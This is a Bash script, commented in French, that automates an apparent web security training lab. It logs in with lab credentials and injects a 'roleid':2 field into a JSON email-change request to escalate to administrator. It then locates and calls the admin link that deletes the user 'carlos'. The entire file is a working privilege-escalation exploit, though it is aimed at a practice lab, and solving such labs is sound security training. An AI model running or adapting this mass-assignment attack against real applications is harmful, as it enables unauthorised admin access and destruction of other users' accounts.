#!/bin/bash

# Usage: ./user_role_profile_simple.sh <LAB_URL>
if [ $# -ne 1 ]; then
    echo "Usage: $0 <LAB_URL>"
    exit 1
fi

LAB_URL="$1"
LOGIN_PATH="/login"
CHANGE_EMAIL_PATH="/my-account/change-email"
ADMIN_PATH="/admin"
COOKIEJAR="cookiejar.txt"

# 1. Connexion
curl -sk -c "$COOKIEJAR" -d "username=wiener&password=peter" -X POST "$LAB_URL$LOGIN_PATH" -o /dev/null
SESSION=$(grep -i 'session' "$COOKIEJAR" | awk '{print $7}' | head -n1)
if [ -z "$SESSION" ]; then
    echo "[-] Échec : impossible d'obtenir un cookie de session."
    rm -f "$COOKIEJAR"
    exit 1
fi

# 2. Modification du profil avec roleid=2 (pas de CSRF requis)
NEW_EMAIL="exploit$(date +%s)@test.com"
JSON_PAYLOAD="{\"email\":\"$NEW_EMAIL\",\"roleid\":2}"
curl -sk -b "session=$SESSION" -H "Content-Type: application/json" -d "$JSON_PAYLOAD" "$LAB_URL$CHANGE_EMAIL_PATH" -o /dev/null

# 3. Accès au panneau admin et suppression de carlos
curl -sk -b "session=$SESSION" "$LAB_URL$ADMIN_PATH" -o admin.html
DELETE_LINK=$(grep -Eo 'href="(/admin/delete\?username=carlos)"' admin.html | cut -d'"' -f2 | head -n1)
if [ -z "$DELETE_LINK" ]; then
    echo "[-] Lien de suppression non trouvé dans le panneau admin."
    cat admin.html | head -20
    rm -f "$COOKIEJAR" admin.html
    exit 1
fi
curl -sk -b "session=$SESSION" "$LAB_URL$DELETE_LINK" -o /dev/null

# 4. Vérification du succès
RESULT=$(curl -sk "$LAB_URL" | grep -Ei "congratulations|solved|success")
if [ -n "$RESULT" ]; then
    echo "[+] Succès : le lab semble résolu !"
else
    echo "[-] Échec : le lab n'a pas été résolu automatiquement."
fi

rm -f "$COOKIEJAR" admin.html
